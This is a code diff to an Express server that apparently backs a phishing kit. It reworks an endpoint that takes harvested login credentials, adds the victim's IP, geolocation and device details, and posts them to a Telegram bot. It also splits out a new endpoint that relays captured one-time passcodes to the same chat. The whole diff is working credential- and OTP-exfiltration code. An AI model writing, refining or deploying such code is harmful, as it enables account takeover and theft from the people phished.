@@ -185,6 +185,7 @@ const rateLimit = (req, res, next) => {
 
 // --- API Routes ---
 
+// Credentials-only endpoint
 app.post('/api/sendTelegram', rateLimit, async (req, res) => {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
@@ -192,24 +193,13 @@ app.post('/api/sendTelegram', rateLimit, async (req, res) => {
   }
 
   try {
-    const { type, data } = req.body;
-    let message;
-
-    if (type === 'credentials') {
-      const clientIP = getClientIp(req);
-      const location = await getIpAndLocation(clientIP);
-      const deviceDetails = getDeviceDetailsWithParser(data.userAgent);
-      const messageData = { ...data, clientIP, location, deviceDetails };
-      message = composeCredentialsMessage(messageData);
-    } else if (type === 'otp') {
-      message = composeOtpMessage(data);
-    } else {
-      const clientIP = getClientIp(req);
-      const location = await getIpAndLocation(clientIP);
-      const deviceDetails = getDeviceDetailsWithParser(req.body.userAgent);
-      const sessionId = req.body.sessionId || Math.random().toString(36).substring(2, 15);
-      message = composeCredentialsMessage({ ...req.body, clientIP, location, deviceDetails, sessionId });
-    }
+    const data = req.body.data || req.body;
+    const clientIP = getClientIp(req);
+    const location = await getIpAndLocation(clientIP);
+    const deviceDetails = getDeviceDetailsWithParser(data.userAgent);
+    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
+    const messageData = { ...data, clientIP, location, deviceDetails, sessionId };
+    const message = composeCredentialsMessage(messageData);
 
     const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -227,6 +217,36 @@ app.post('/api/sendTelegram', rateLimit, async (req, res) => {
     return res.json({ success: true, sessionId: data?.sessionId });
   } catch (error) {
     console.error('Function execution error:', error.message);
+    return res.status(500).json({ error: 'An internal server error occurred.' });
+  }
+});
+
+// Separate OTP-only endpoint
+app.post('/api/sendOtp', rateLimit, async (req, res) => {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
+    return res.status(500).json({ success: false, message: 'Server misconfiguration.' });
+  }
+
+  try {
+    const message = composeOtpMessage(req.body);
+
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
+      signal: createTimeoutSignal(FETCH_TIMEOUT),
+    });
+
+    if (!telegramResponse.ok) {
+      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
+      console.error('Telegram API Error:', errorResult.description);
+      return res.status(502).json({ success: false, error: 'Failed to send OTP message.' });
+    }
+
+    return res.json({ success: true });
+  } catch (error) {
+    console.error('sendOtp error:', error.message);
     return res.status(500).json({ error: 'An internal server error occurred.' });
   }
 });
